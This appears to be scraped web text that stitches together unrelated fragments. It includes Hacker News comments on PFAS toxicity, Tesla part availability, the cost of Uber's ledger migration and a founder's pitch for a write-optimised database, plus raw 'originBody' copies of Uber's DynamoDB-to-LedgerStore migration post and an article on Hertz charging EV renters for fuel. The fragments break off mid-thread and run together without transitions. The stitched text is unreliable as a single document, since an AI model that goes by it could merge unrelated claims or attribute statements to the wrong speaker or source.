They're very useful substances. Yes, acute exposures cause harm, but the same can be said of salt. Though with modern instrumentation we can measure presence in parts per trillion, I have seen no evidence at all that likely bioaccumulative pathways have resulted in harm to humans. Even the opening of this article levers \"we found it\" with \"EPA regulates it in drinking water\" as self-evident that it's some kind of super poison. But it's not. Frankly, it's not always even clear what \"it\" is as there are thousands of different compounds, many of which people consume daily (e.g., flonase, prozac, etc). The health alarm around these substances is just astounding to me. reply calibas 3 hours agoparentIronic, just about every time I see industry propaganda that defends some toxic chemical, they use two tactics. First, compare it to something else everybody uses and considers harmless. Second, repeat over and over again there's no studies that show it's harmful at very very low doses. You managed to do both. reply mateo1 1 hour agorootparentThat's because these are generally valid arguments. The phrase \"the dose makes the poison\" did not just occur in someone's head for no reason. There's a couple things to note about \"forever chemicals\": They're around \"forever\" because they are extremely unreactive. The concentrations the public is concerned about are ridiculous. With such small concentrations, huge timescales for the cause-effect chain to take place and countless confounding factors in between it's basically impossible to make the bold claims the general public makes. That being said: Workers are exposed to much higher concentrations and they should have been protected from it. New chemicals shouldn't be used as widely as they do by simply assuming they're safe. There are uses (like cosmetics etc) were no risk is really warranted so they should be more restricted with what they use. At the end of the day though, when you ban something you need to really understand and take into consideration what kind of damage you'll do to people by banning a substance and all the products that depend on it vs. what kind of damage the substance will do. You can't pretend that you can just ban a whole class of really important compounds without any societal side effects. And that's coming from someone who's really concerned about dangerous chemicals. If you know chemistry, and look around you, you can tell there's a lot more dangerous issues than PFAS that aren't being tackled and nobody seems to care about. Primarily how nobody seems to check what's really included in tons of \"cheap\" (in terms of manufacturing, not always of price) imported cosmetics, personal hygiene products and parapharmaceuticals. People are buying protein powders and supplements of unknown producers, raw materials and manufacturing methods by the kilos, plastic cooking utensils from the internet and boil/oven bake them with their food, buy sketchy adhesives for their PVC water pipes, and then complain about some 1ppt concentration of inert chemicals in their drinking water. I understand how the public is easily swayed on things that are technical, and I am happy with people being aware of potential dangers, but the focus is really misplaced on something that looks new, scary, unsolvable and interesting instead of tackling the old, boring but important and serious issues we come across every day. reply Goronmon 1 hour agorootparentThe phrase \"the dose makes the poison\" did not just occur in someone's head for no reason.

They had shown PFOS to be toxic, yet the results remained secret, even to many at the company. In one early experiment, conducted in the late ’70s, a group of 3M scientists fed PFOS to rats on a daily basis. Starting at the second-lowest dose that the scientists tested, about 10 milligrams for every kilogram of body weight, the rats showed signs of possible harm to their livers, and half of them died. At higher doses, every rat died. Soon afterward, 3M scientists found that a relatively low daily dose, 4.5 milligrams for every kilogram of body weight, could kill a monkey within weeks. (Based on this result, the chemical would currently fall into the highest of five toxicity levels recognized by the United Nations.) This daily dose of PFOS was orders of magnitude greater than the amount that the average person would ingest, but it was still relatively low — roughly comparable to the dose of aspirin in a standard tablet. the only propaganda about PFOS was made by 3M, telling us these chemicals were safe, when they knew they weren't. reply Aloisius 31 minutes agorootparentThey asked for a study that showed they are harmful in the doses that humans are exposed to.

Seemed to be pretty much the same as my 2003 Chevy Silverado. You are definitely correct about foreign (non-USA) makes. My wife had an Audi when we got married. I own a small toolbox of tools specific to her Audi S4 that I will never use again, but that was a 2006, so this issue predates 2013 for the makes that it is true about. Admittedly, I try to avoid fuel injected vehicles.

Tesla is one of very, very few companies for which its parts aren't available via the OEMs; parts made for Teslas can only be had via Tesla. If some part in your VW goes bad or breaks or wears, you often have up to three options: from VW via dealers, via the OEM that made the part for VW, via parts distributors - or via non-OEMs that have made a compatible part. VW (and others) often source from multiple OEMs or switch OEMs, so you sometimes have multiple OEM supplier options. With Tesla? Only via them. For every fucking part on the car save stuff like brake pads and rotors. You have to give them a VIN number to buy a part, and if the VIN belongs to a car Tesla has decided isn't roadworthy anymore, they won't go any further. Want to put a small block chevy V8 into your Yugo? The guy at the GM dealer part counter will happily sell you one as long as you've got the money. Discovered that a Ford temperature sensor is a more reliable replacement for the one in your Jeep? The parts counter staff won't even blink when they sell you one. The only time you'll get asked for a VIN is if the part you're asking for has varied with production, and certain VIN ranges might require a specific part for compatibility. reply mulmen 14 hours agorootparentThis is the most exciting thing about the GM EVs to me.

I know that the manufacturers create one for dealers and that there are/were companies that tear cars down to make their own, but it feels like when I’ve needed to go find instructions for things there’s a staggering variety of manuals of varying levels of helpfulness.

I’d say there’s a very wide range of quality between various manufacturers’ FSMs. Toyota ones are great with diagnostic instructions and explicit parameters to match, whereas other brands I’ve leafed through have completely muddy pictures and poor instructions or no figures. For third parties, I find Bentley manuals to be extremely good and thorough. reply sq_ 14 hours agorootparentThe car that I'm most interested in fixing something on at the moment is a Toyota, so that's great to hear about their manuals.

They also lose time on the hard stuff that nobody in the place does on a routine basis like wire harness repairs.

    "originBody": "Uber Blog Sign up Engineering Schedule rides in advance Reserve a ride Engineering Migrating a Trillion Entries of Uber’s Ledger Data from DynamoDB to LedgerStore April 11 / Global Introduction Last week, we explored LedgerStore (LSG) – Uber’s append-only, ledger-style database. This week, we’ll dive into how we migrated Uber’s business-critical ledger data to LSG. We’ll detail how we moved more than a trillion entries (making up a few petabytes of data) transparently and without causing disruption, and we’ll discuss what we learned during the migration. History Gulfstream is Uber’s payment platform. It was launched in 2017 using DynamoDB for storage. At Uber’s scale, DynamoDB became expensive. Hence, we started keeping only 12 weeks of data (i.e., hot data) in DynamoDB and started using Uber’s blobstore, TerraBlob, for older data (i.e., cold data). TerraBlob is similar to AWS S3. For a long-term solution, we wanted to use LSG. It was purpose-built for storing payment-style data. Its key features are: It is verifiably immutable (i.e., you can check that records have not been altered using cryptographic signatures) Tiered storage to manage cost (the hot data is kept at a place that is best to serve requests and cold data is stored at a place that is optimized for storage) Better lag for eventually consistent secondary indexes So, by 2021, Gulfstream was using a combination of DynamoDB, TerraBlob, and LSG to store data. DynamoDB for the last 12 weeks of data TerraBlob, Uber’s internal blob store, for cold data LSG, where we were writing data, and wanted to migrate to it Why Migrate? LSG is better suited for storing ledger-style data because of its immutability. The recurring cost savings by moving to LSG were significant. Going from three to a single storage would simplify the code and design of the Gulfstream services responsible for interacting with storage and creating indexes. This in turn makes it easy to understand and maintain the services. LSG promised shorter indexing lag (i.e., time between when a record is written and its secondary index is created). Additionally, it would give us faster network latency because it was running on-premises within Uber’s data centers. Figure 1: Data flow before and after the migration Nature of Data & Associated Risk The data we were migrating is all of Uber’s ledger data for all of Uber’s business since 2017: Immutable records – 1.2 PB compressed size Secondary indexes – 0.5 PB uncompressed size Immutable records should not be modified. So, for all practical purposes, once we have written a record, it can’t be changed. We do have the flexibility of modifying secondary index data for correcting problems. Checks To ensure that the backfill is correct and acceptable in all respects, we need to check that we can handle the current traffic and the data that is not being accessed currently is correct. The criteria for this was: Completeness: All the records were backfilled. Correctness: All the records were correct. Load: LSG should be able to handle current load. Latency: The P99 latency of LSG was within acceptable bounds. Lag: The secondary indexes are created in the background. We want to make sure that the delay of the index creation process was within acceptable limits. The checks were done using a combination of shadow validation and offline validation. Shadow Validation This compares the response that we had been returning before migration with the one that we would return with the LSG as data source. This helps us ensure that our current traffic will be disrupted by neither data migration issues nor code bugs. We wanted our backfill to be at least 99.99% complete and correct as measured by shadow validation. We also had a 99.9999% upper bound for the same. The reason for having an upper bound are: When migrating historical data, there are always data corruption issues. Sometimes this is because data was not written correctly during the initial development time of the service. It is also possible to see data corruption because of scale. As an example, S3 gives 11 nines of durability guarantee then you can expect 10 corruptions in 1 trillion records. Indexes are eventually consistent, which means that some records will appear after a few seconds. So, the shadow validation will flag them as missing. This is a false positive that shows up at a large scale. For 6 nines, you have to look at data of 100 million comparisons to give any results with good confidence. This means if your shadow validation is comparing 1,000 records/second, then you need to wait for a bit more than one day just to collect sufficient data. With 7 nines, you will have to wait 12 days. In practical terms this would slow the project to a halt. With a well-defined upper bound, you are not forced to look at every potential issue that you suspect. Say if the occurrence of a problem is 1/10 of the upper bound, you need not even investigate it. With 6 nines, we could end up with slightly more than 1 million corrupt records. Even though 6 nines of confirmed correctness could mean a real cost to the company, the savings generated by this project outweighed the potential cost. During shadow validation you are essentially duplicating production traffic on LSG. So by monitoring LSG, we can verify that it can handle our production traffic while meeting our latency and lag requirements. It gives us good confidence in the code that we wrote for accessing the data from LSG. Additionally, it also gives us some confidence about completeness and correctness of data, particularly with data that is currently being accessed. We developed a single generic shadow validation code that was reused multiple times for different parts of the migration. During the migration process we found latency and lag issues because of multiple bugs in different parts and fixed them. Partition key optimization for better distribution of index data Index issues causing scan of the record instead of point lookup Unfortunately, live shadow validation can’t give strong guarantees about our corpus of rarely-accessed historical data. Offline Validation & Incremental Backfill This compares complete data from the LSG with the data dump from DynamoDB. Because of various data issues, you have to skip over bad records to ensure that your backfill can go through. Additionally, there can be bugs in the backfill job itself. Offline validation ensures that the data backfill has happened correctly and it covers complete data. This has to be done in addition to shadow validation because live traffic tends to access only recent data. So, if there are any problems lurking in the cold data that is infrequently accessed, it will not be caught by shadow validation. The key challenge in offline validation is size of data. The biggest data that we tackled was 70 TB compressed (estimated 300 TB uncompressed) in size and we compared 760 billion records in a single job. This type of Apache SparkTM job requires data shuffling and Distributed Shuffle as a Service for Spark combined with Dynamic Resource Allocation and Speculative Execution let us do exactly that at a reasonable speed under resource constraints. Offline validation found missing records and its output was used for incremental backfill. We iterated between offline validation and backfill to ensure that all the records were written. Backfill Issues Every backfill is risky. We used Uber’s internal offering of Apache Spark for the backfills. Here are the different problems that we encountered and how we handled them. Scalability You want to start at a small scale and scale up gradually till you hit the limit of the system. If you just blindly push beyond this point then you are effectively creating a DDoS attack on your own systems. At this point, you want to find the bottleneck, address it, and then scale up your job. Most of the time it’s just a matter of scaling up downstream services, other times it can be something more complex. In either case, you don’t want to scale your backfill job beyond the capability of the bottleneck of the system. It’s a good idea to scale up in small increments and monitor closely after each scale-up. Incremental Backfills When you try to backfill 3 years’ worth of data in say 3 months, you are generating traffic that puts 10x the normal traffic load and the system may not be able to cope with this traffic. As an example, you will need 120 days to backfill 100B records at 10K/sec rate when your production normally handles 1K/sec rate. So, you can expect the system to get overloaded. If there is even a remote chance of the backfill job causing an ongoing problem, you must shut it down. So, it is unrealistic to expect that a backfill job can run from start to finish in one go, and therefore you have to run backfills incrementally. A simple and effective way to do this is to break the backfill into small batches that can be done one by one, such that each batch can complete within a few minutes. Since your job may shut down in the middle of a batch, it has to be idempotent. Every time you complete a batch you want to dump the statistics (such as records read, records backfilled, etc.) to a file. As your backfill continues, you can aggregate numbers from them to check the progress. If you can delete or update existing records, it lowers the risk and cost of mistakes and code bugs during the backfill. Rate Control To backfill safely, you want to make sure that your backfill job behaves consistently. So, your job should have rate control that can be easily tweaked to scale up or scale down. In Java/Scala you can use Guava’s RateLimiter. Dynamic Rate Control In some cases, you may be able to go faster when there is less production traffic. For this you need to monitor the current state of the system and see if it’s ok to go faster. We adjusted RPS on the lines of additive increase/multiplicative decrease. We still had an upper bound on the traffic for safety. Emergency Stop The migration process needs the ability to stop backfill quickly in case there is an outage or even suspicion of overload. Any backfill during an outage has to be stopped as both a precaution and as a potential source of noise. Even post-outage, systems tend to get extra load as systems recover. Having the ability to stop backfill also helps debug scale-related issues. Size of Data File When dumping data, keep the size of the files to around 1GB with 10x flexibility on both sides. If the size of the file is too big, you run into issues such as MultiPart limitation of different tools. If your file size is small, then you have too many files and even listing them will take significant time. You may even start hitting ARGMAX limit of when running commands in a shell. This becomes significant enough to make sure that every time you do something with data it has been applied to all files and not just some of them. Fault Tolerance All backfill jobs need some kind of data transformation. When you do this you inevitably run into data quality/corruption issues. You can’t stop the backfill job every time this happens because such bad records tend to be randomly distributed. But you can’t ignore them as well because it might also be because of a code bug. To deal with this, you dump problematic records separately and monitor statistics. If the failure rate is high then you can stop the backfill manually, fix the problem, and continue. Otherwise, let the backfill continue and look at the failures in parallel. Another reason for records not getting written is RPC timeout. You can retry for this, but at some point, you have to give up and move ahead irrespective of the reason to make sure you can make progress. Logging It is tempting to log during backfill to help with debugging and monitor progress, but this may not be possible because of the pressure that it will put on the logging infrastructure. Even if you can keep logs, there will be too much log data to keep around. The solution is to use a rate limiter to limit the amount of logs that you are producing. You need to rate limit only the parts that produce most of the logs. You can even choose to log all the errors if they happen infrequently. Mitigating Risk In addition to analyzing data from different validation and backfill stats we also were conservative with the rollout of LSG. We rolled it out over a few weeks and with go-aheads from on-call engineers of the major callers of our service. We initially rolled out with fallback (i.e., if the data was not found in LSG, we would try to fetch it from DynamoDB). We looked at the fallback logs before we removed the fallback. For every record that was flagged as missing in the fallback logs we checked LSG to make sure that it was not really missing. Even after that we kept the DynamoDB data around for a month before we stopped writing data to it, took a final backup, and dropped the table. Figure 2: LSG Rollout Conclusion In this article, we covered the migration of massive amounts of business-critical money data from one datastore to another. We covered different aspects of the migration, including criteria for migration, checks, backfill issues, and safety. We were able to do this migration over two years without any downtime or outages during or after the migration.

You tell it to snapshot, it instantly snapshots, you can run a differential/incremental backup at great speeds. Your RAID controller is already caching the hot data, so the impact is minimal.

Why take a system not designed for this sort of scale and force it to scale, rather than use systems which are designed and tested for this scale and volume? All you will do is hackily re-invent all the other things that the other databases had to do to scale to this extent. Plus size is only one limit, you would be limited to 1 write every few milliseconds. My napkin maths estimate is that there are at least 1-2m writes per hour going into this thing, so probably 300-600 writes / second (Average) and maybe over 1k writes/second peak.

They are structured and run like a tech company but imo they don’t produce a tech product. reply qaq 4 hours agoparentprevIf you read the article the system was a layer on top of DynamoDB they updated it to use internal product Docstore which required adding a feature to Docstore. So it's not as involved as people make it out to be. Also records are immutable which makes a lot of things way easier. reply inoop 6 hours agoparentprevI'd be curious as well to see a more complete cost-benefit analysis, and I'd be especially interested in labor cost. We don't know how much time and head count Uber committed to this project, but I would be impressed if they were able to pull this off with fewer than 6-8 people. We can use that to get a very rough lower-bound cost estimate. For example, AWS internally uses a rule of thumb where each developer should generate about $1MM ARR (annual recurring revenue). So, if you have 20 head count, your service should bring in about $20MM annually. If Uber pulled this off with a team of ~6 engineers, by AWS logic, they should about break even. Another rule of thumb I sometimes see applied is 2x developer salary. So for example, let's assume a 7-person team of 2xSDE1, 3xSDE2, 1xSDE3, and 1xSTAFF, then according to levels.fyi that would be a total annual salary of $2.3MM. Double that, and you get $4.6MM/year to justify that team annual cost footprint, which is still less than $6MM. Of course, this is assuming a small increase in headcount to operate this new, custom data store, and does not factor in a potentially significant development and migration cost. So unless my math is completely off, it sounds to me like the cost of development, migration, and ownership is not that far off from the cost of the status quo (i.e. DynamoDb). reply shrubble 5 hours agorootparentIf the savings are 6 million per year, then in later years it should pay off since the development is a one time cost. reply inoop 5 hours agorootparentThe cost doesn't suddenly drop to zero once development is done. Typically a system of this complexity and scale requires constant maintenance. You'll need someone to be on-call (pager duty) to respond to alarms, you'll need to fix bugs, improve efficiency, apply security patches, tune alarms and metrics, etc. In my experience you probably need a small team (6-8 people) to maintain something like this. Maybe you can consolidate some things (e.g. if your system has low on-call pressure, you may be able to merge rotations with other teams, etc.) but it doesn't go down to zero. reply Rastonbury 5 hours agorootparentprevNot an engineer, but something like this takes 6-8 people working on only this for a full year? reply inoop 4 hours agorootparentThat has been my experience, yes. You need one full-time manager, one full-time on-call/pager duty (usually a rotation), and then 4-6 people doing feature development, bug fixes, and operational stuff (e.g. applying security patches, tuning alarms, upgrading instance types, tuning auto-scaling groups, etc. etc.). Maybe you can do it a bit cheaper, e.g. with 4-6 people, but my point is that there's an on-going cost of ownership that any custom-built solution tends to incur. Amortizing that cost over many customers is essentially the entire business model of AWS :) reply mlrtime 6 hours agoparentprevYou're assuming that the team only works on this product.

I assume because engineers are already viewed as a sunk cost or maybe it’s just because it’s way less tangible.

Half the time I suspect it’s just so people have something to work on, rather than it being some critical fix. reply vertis 4 hours agoparentA better strategy as a company this size would be to write the PRD for moving and then call AWS and negotiate. reply rmbyrro 1 hour agorootparentI think it's likely that they tried this. But DynamoDB is expensive to consume probably because it's expensive to run and maintain. If you develop for a particular use case, a lot of optimizations can reduce these costs.

That is because an investment is a one-off, so it's actually worth $1, but the savings are recurring, so they are worth the same number of years that a company's profits are valued. Depending on sector and investors' beliefs in the future of companies, this factor is typically in the 5-20x range. That means that $1 of savings is well worth at least $5 of investments. Factor in anything you want! reply shermantanktop 4 hours agorootparentIn an ideal org, perhaps.

Note - I admit, all of this ignores two key things (a) we dont know the engineers salaries who built this and (b) we dont know the ongoing maintenance costs. reply gtirloni 6 hours agoparentprevIf anything, it reduces Uber's exposure to AWS' proprietary technology. I don't know how to measure how much that's worth but they probably do. reply vertis 4 hours agorootparentCompanies this size almost certainly have different terms of use. I worked for a smaller, but still ASX200 company that had a custom contract, and assigned staff that would drop by 2-3 days a month. Of specific note was that if AWS wanted to stop doing business with us they had to give at least X notice (from memory that was 12 months for us). For our risk profile this was more than enough time to migrate off any AWS' proprietary technology. That makes it worth less to avoid exposure. reply scarface_74 4 hours agorootparentprevThis usually comes from people who have never done a mass migration at scale. You’re always dependent on your infrastructure. Even if you have nothing but everything hosted on a bunch of VMs, it can take years and millions of dollars to migrate.

You have a direct and tangible savings for engineering time invested. That possible value they could otherwise derive is moot and hypothetical, this is the real deal! But if we’re being honest, there isn’t actually any meaningful quantification of engineering time to understand return on investments at this level (not to say there’s none, but it sure does get wish washy). Corporate and engineering strategy isn’t so carefully weighed, and to believe otherwise is to fall victim to the pseudoscience that is software estimation. You just have to estimate directionally if a given proposal has you heading in a better direction in the long term, pursue that, and course correct along the way. Put another way, the end state justifies the means and resourcing. It’s rarely possible to fully understand either the costs or benefits with much accuracy up front. You slowly put more resources into projects that show promise, and revoke them if the projects do not appear to be heading in a value add direction. reply cj 2 hours agorootparent>You don’t need to consider the cost they could drive during that time. You don't need to, but you 100% should. \"Opportunity cost\" (cost of not doing something) is real. This is the problem with all refactoring/migration projects.

On one side, you have rosy projections. On the other, a cap on gains, so sure everyone picks the first, but nobody measures if it worked.

The gross spend for each engineer is probably closer to $0.5 million annually. You can layoff 5% without any impact on the company and save so much more. A company like Uber ($130B market cap) isn't going to bother with building something internally to save $6M/year. The only reason to do it is improve efficiency that actually improves the user experience, which then we're talking about a big deal.

For example, if a customer registers with the name of a deleted customer, which will resurface some \"unfinished\" transactions or rules associated with the older version of the \"same\" customer that haven't been properly deleted but appeared to be deleted for a while. Also, in general, deletion is very difficult because money doesn't just disappear. You'd need some sort of compaction (think: Git squash) rather than deletion to be able to balance the system's books... but then you'd be filling the system with fake transactions... From my experience from working with these kinds of systems, the typical solution is to label entities with active/inactive labels to substitute deletion. But entities never go away. reply kobalsky 4 hours agorootparentI agree with you, but there is a plus for deleting old data.

There is a lot of advice here and in general on that but you definitely need to be making calls with that type of business. reply padjo 7 hours agorootparentYep nobody with the problem you’re offering to solve is going to solve it by googling and picking some random company they’ve never heard of with no track record. reply bjornsing 6 hours agorootparentNot even click a search ad and fill in a contact form? When I’m on the other side of the table I do that. But perhaps I’m unique in that aspect? (I understand there won’t be any significant business without enterprise sales. But that’s not what I’m looking for at this stage.) reply narnarpapadaddy 6 hours agorootparentThe companies that have these types of problems all have AWS reps (or whatever vendor) that get first crack at a solution, even if their senior engineers or CTOs do some googling. Frequently discounts can be negotiated on products that aren’t a perfect fit, or companies will get early access to new products that solve their problem (AWS calls this “limited preview”). A good chunk of B2B infrastructure products like this are developed using a “golden partner” model. The first customer (or few) gets a free or reduced cost license, the developer gets a real-world scenario with real data to use to figure out what the minimal functionality actually is to be a marketable product and to work out bugs. This arrangement frequently requires a preexisting relationship and trust between both parties. reply bjornsing 6 hours agorootparentYep. Always a bit dangerous to go up against AWS and similar. My hope here is that this product is too niche for the major cloud vendors to invest in. But since Uber is building stuff themselves that assumption may be wrong. A “golden partner” model makes a lot of sense, thanks. reply narnarpapadaddy 6 hours agorootparentIf you know a technology leader at a company that has this problem, reach out and ask if they’ve had any pain related to it. Ask to take them out to lunch and tell them about a solution you’ve been working out. Or even a short demo call. See if they’d be interested in an “innovation partnership.” You give them a discounted/free license (can be time limited to a year or however long it takes to validate that your solution works and saves them money - then returns to full-price), they agree to feature prominently in your marketing material or provide a reference for your next lead. reply macspoofing 5 hours agorootparentprev>When I’m on the other side of the table I do that No, you don't. There are many established storage solutions out there. If you're in the market for one, you can easily fill days, weeks or months vetting those. So, why would you bother dealing with a sales rep from a random one you never heard of before, and isn't used by anyone. You don't even provide any details on what makes it different or better from anything else out there. reply bjornsing 4 hours agorootparentWell the reason I’m working on this in the first place is that when I was on the other side of the table I was looking for one. I filled in the contact forms of a couple of different startups that had products somewhat in line with what I was looking for, and talked to their sales reps. Admittedly they weren’t as early stage as my project, but on the other hand they weren’t 100% focused on my use-case either. I guess what I’m trying to say is that I was hoping that someone with a write intensive workload would want to spend some time evaluating a product built specifically for that. But perhaps I’m wrong? Even if your workload was 99% writes you’d rather go to some established player (e.g. MongoDB) with a product optimized for 50/50 read/write? reply macspoofing 4 hours agorootparent>I guess what I’m trying to say is that I was hoping that someone with a write intensive workload would want to spend some time evaluating a product built specifically for that. Again, it's not clear to me exactly what it is you're doing that's any different from the plethora of existing off-the-shelf solutions. You're saying that you started this project/company because you were looking for a solution to a specific use case (write-intensive workloads) and existing options didn't work - can you expand on that? Can you create a chart, for example, that lists out the specific things that Haystackdb does and alternatives don't? Presumably, if you optimize for write-intensive workloads, there are some drawbacks when it comes to reads - no? Or maybe storage? That's good to highlight. What you need are whitepapers/blog posts/youtube videos/talks at conferences/etc. that highlight the technical details of your solution, because you're trying to get technical people interested in your product to the point where they will invest time to learn more. reply bjornsing 4 hours agorootparentWell, it’s pretty simple: HaystackDB is designed from the ground up for write intensive workloads, so it’s much more economical than existing off-shelf-solutions for that type of workload. Is that not clear from the landing page? From pricing: “$0.2 per million writes, $20 per million reads”. The typical cost profile is $2 per million read/writes, or even more for writes. reply macspoofing 1 hour agorootparent>Is that not clear from the landing page? The marketing byline you have on your landing page is clear enough, but nobody will take that seriously without a deeper technical description. When I read it, I assumed you wrote some code to move data in and out of lower-cost S3 or Glacier storage because you don't control storage pricing and you run on top of existing public cloud infrastructure. Maybe I'm right, maybe I'm wrong - but if I'm looking for a solution, I need to assess whether I should invest time and effort to do a deeper dive, and that's the box I would put you in, without any more detail. Anyway, good luck. Hope it works out. reply yau8edq12i 3 hours agorootparentprevForgive me because what follows will sound harsh, but I think you need to hear it based on your response. > HaystackDB is designed from the ground up for write intensive workloads Okay. > so it’s much more economical than existing off-shelf-solutions for that type of workload. That's a leap in logic. Just because you designed it with this workload in mind, well, doesn't automatically mean that it's any good for this workload (or any workload). If solving a problem was as easy as declaring \"I will design my solution from the ground up for this problem\", then we'd all live in peace and harmony. So that's what people are asking you here: how do you make your DB \"much more economical\" for that type of workload? What technology, what ideas have you had to make it possible? If you don't want to reveal that, then you need proof that it's better than the competition, not a declaration, that it's better than the competition. > Is that not clear from the landing page? It's clear that you want to market your solution as something good for write-heavy workloads. Why should we believe you've done a good job designing your solution? > From pricing: “$0.2 per million writes, $20 per million reads”. The typical cost profile is $2 per million read/writes, or even more for writes. Who knows how you came up with pricing? Perhaps you're betting on your customers being stupid and not realizing that taking a 10x hit on the price of reads will lose them (and earn you) more money in the long run. After all, what good is writing to a DB if you never read from it...? Or perhaps it's some kind of promotional / loss leader pricing that will change soon in the future. In any case, it's, again, not proof that your solution is adapted to the customer's problem. reply bjornsing 2 hours agorootparent> Forgive me because what follows will sound harsh, but I think you need to hear it based on your response. No worries. I appreciate you taking the time. > you need proof that it's better than the competition, not a declaration, that it's better than the competition Fair point. I realize I’ll need that before making any sales. But I was hoping to get a few leads from the contact form without it. > Perhaps you're betting on your customers being stupid and not realizing that taking a 10x hit on the price of reads will lose them (and earn you) more money in the long run. After all, what good is writing to a DB if you never read from it...? No it’s not a malicious trick. There are use-cases where most records will never be read back. For example, if you go into the Uber app you can find a history of all your trips and you can click one and bring up a receipt for it. Most users will rarely if ever do that. So you end up writing many more receipts to your database than what you’ll ever retrieve. reply smokel 8 hours agoparentprevWith a disclaimer that I have no formal nor practical background in marketing, here are some ideas: 1. It is a bit unclear to me when I would use Haystack. The main advantage seems to be cost cutting. It would be nice to see some realized examples of this. 2. When competing for price, you may look like the cheap, and thereby untrusted alternative. There is a risky business paradox here, for which I am sure a fellow HN poster will supply the name: you charge less, therefore you make less, and you will not be able to sustain the service, making me not want to spend money. 3.

One reason I haven’t priced it ridiculously cheap is to avoid this judgement, and fate. With this pricing I won’t necessarily have a smaller profit margin than competitors.

A bit hesitant to reach out to potential customers though before I have a solid product I can deliver. But perhaps I shouldn’t be? Companies generally have to be suffering pretty badly to take a risk on changing their tech stack to something unproven. And the risk for you at that point is that they choose to spend 10x on consultants to implement some existing system instead. The CTO needs to trade off the opportunity cost of developing new features/existing maintenance against integrating an unproven product. How can you de-risk this for them? (Even just showing that you recognize that this is the case can help) Maybe this is a time to \"do things that don't scale\". ie: offer to integrate it into their system for them (for at least some small part/pain point), and likely in parallel so that they can evaluate it without taking down the existing system.

I manage a system with a very write-heavy workload (lots of small writes) and even though our writes far outpace our reads, this pricing makes your system about ten times more expensive than an RDS cluster. There's no data about performance. There's no information on how or whether data is persisted to durable storage before a write is acknowledged. There's not even any information on how big keys or values can be. There's no public information on support. When choosing a system like yours, my priorities are: 1. Data safety 2. Performance 3. Cost ... In that order. You've done nothing to educate me on 1 and 2 and your pricing isn't better than what you're seeking to displace. When your product is a tool for developers, show up with hard facts about your product. Zero people (as you've seen) are even remotely interested in building a product on top of a system without knowing whether the system will hold up to their use case. And other than a very anemic FAQ section, you have no documentation at all, whatsoever. reply bjornsing 3 hours agorootparentAll valid points. I guess I’m hesitant to put time into documentation and similar, if I can’t somehow find a steady stream of sales prospects. > even though our writes far outpace our reads, this pricing makes your system about ten times more expensive than an RDS cluster That indeed sounds off… Are you sure you’re comparing the total cost to that of an RDS cluster? I am aware that reads will be more expensive (due to the write optimization), but I was hoping most customers would make it back on cheap writes. Also the storage itself ($0.23 per GB-month) should be much cheaper than RDS. reply bastawhiz 2 hours agorootparentMy total database is maybe 400 gigs. Most of the writes overwrite existing data, so storage cost isn't a concern. With the cost of an upfront RI for the year on RDS (with basically as many iops as I can use), your solution gives me ~100 million reads. That's...like a month of usage at best. At least I'm my case, the fundamental problem you're facing is that reads are just too expensive. Writes and reads tend to grow at the same pace in many products: there's a ratio that tends to stay the same as you scale. $20/million reads is just a _lot_. The ratio of writes to reads for your pricing needs to be 100:1 or more for it to make sense for me, but I'm more like 10-20:1. > I guess I’m hesitant to put time into documentation and similar, if I can’t somehow find a steady stream of sales prospects. This is part of why a database company is hard to build. You will simply not find anyone willing to give you money, because the alternative is going to be a solution your customers already know and understand and which is likely extremely mature. You're competing with Postgres and Mongo. You can't ship a database product that doesn't work: you're asking people to build on you for their storage primitive. If you fuck up, that's a business-ending event for your customer. You've either got to come to the table with an extremely compelling product (\"I couldn't build my business without this\") or you've got to show why someone should trust you over an established but somewhat more expensive alternative. reply bjornsing 2 hours agorootparent> The ratio of writes to reads for your pricing needs to be 100:1 or more for it to make sense for me Correct.

    "originBody": "News → Car Tech → Electric Vehicles Hertz Charging a Tesla Renter for Gas Was Not an Isolated Incident Hertz billing a customer hundreds of dollars for gas in an EV wasn’t a one-off mistake. In fact, it may have been happening for more than a year. BY JAMES GILBOYPUBLISHED MAY 17, 2024 9:55 AM EDT NEWS Hertz SHARE 0 JAMES GILBOY View James Gilboy's Articles _JamesGilboy jamesgilboy Hertz's foray into renting EVs hasn't been a runaway success. The rental agency is liquidating its excess Teslas due to limited demand and tanking values, while those who have rented its EVs haven't always had a good experience. Last week, we reported on a customer who was charged $277 for gasoline his rented Tesla couldn't have possibly used—and now, we've heard from other Hertz customers who say they've been charged even more. Hertz caught attention last week for how it handled a customer whom it had charged a \"Skip the Pump\" fee, which allows renters to pay a premium for Hertz to refill the tank for them. But of course, this customer's rented Tesla Model 3 didn't use gas—it draws power from a battery—and Hertz has a separate, flat fee for EV recharges. Nevertheless, the customer was charged $277.39 despite returning the car with the exact same charge they left with, and Hertz refused to refund it until after our story ran. It's no isolated incident either, as other customers have written in to inform us that it happened to them, too. Update May 20, 2024, 1:15 p.m. ET: A Hertz representative reached out to The Drive with the following statement after publication, explaining that these erroneous charges were due to a \"systems error\" that has since been fixed. From Hertz: \"Some customers who rented EVs from us were inaccurately billed a refueling fee, due to a systems error. It should never have happened, and we have fixed the problem that caused it. We also proactively reached out to the customers who were affected and refunded the erroneous charge. To compensate them for their inconvenience, we have offered them a credit toward a future EV rental.\" A lineup of Hertz Polestar 2 EVs. Hertz One customer named Evan told us that when he booked a Tesla Model 3 Long Range, his problems began well before it came time to return the car. On pickup, he was told the Long Range model he'd reserved was unavailable, and that he'd been downgraded to a standard-range model. He had to go to a manager to get any recourse, which ended up being just a $22 discount. Evan returned the rental at 21 percent charge, expecting to pay a flat $25 recharge fee. (It's ordinarily $35, but Hertz's loyalty program discounts it.) To Evan's surprise, he was hit with a $340.97 \"Skip the Pump\" fee, which can be applied after returning a car if it's not requested beforehand. He says Hertz's customer service was difficult to reach, and that it took making a ruckus on social media to get Hertz's attention. In the end, a Hertz representative was able to review the charge and have it reversed. But Evan was told it could take five to seven business days for the money to transfer, and for his troubles, he was offered just one free day of renting an EV (to be redeemed this calendar year, no less). Some of Evan's interactions with Hertz customer service regarding his fuel charges. Photos used with permission Fellow Hertz customer Toan Le reported an even worse experience with their Tesla rental earlier this month. They told us they prepaid $329.83 for a week with a Model 3, and returned the car expecting to pay only $25 for Hertz to charge it. Le was then apparently billed $690.32, some of which was redundant billing for the rental they say they'd already paid for. To add insult to injury, their invoice (shown here) indicates more than two thirds of that, $475.19, was a fuel charge, which was applied in addition to the $25 charging fee. They also faced a $125.01 \"rebill\" for using the Supercharger network during their rental, which other Hertz customers have expressed surprise and frustration with. Charging costs can vary, but a 75-percent charge from a Supercharger will often cost in the region of just $15. Toan Le's invoices for their Tesla Model 3 rental, plus an email from Hertz's customer 